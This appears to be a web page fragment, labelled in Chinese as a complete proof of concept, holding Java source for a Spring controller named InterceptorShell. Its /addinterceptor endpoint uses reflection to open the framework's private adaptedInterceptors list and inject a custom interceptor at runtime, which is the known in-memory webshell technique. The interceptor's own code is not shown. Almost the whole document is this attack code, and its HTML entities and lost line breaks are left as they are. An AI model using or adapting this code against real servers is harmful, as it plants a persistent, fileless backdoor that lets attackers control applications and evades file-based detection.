完整POCpackage com.example.springshell.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.handler.AbstractHandlerMapping;import com.example.springshell.interceptor.testfilter;import java.lang.reflect.Field;@Controllerpublic class InterceptorShell &#123;    @RequestMapping(&quot;/addinterceptor&quot;)    public void shell() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(&quot;requestMappingHandlerMapping&quot;);        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);        field.setAccessible(true);        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);        testfilter testfilter = new testfilter();        adaptedInterceptors.add(testfilter);    &#125;&#125;
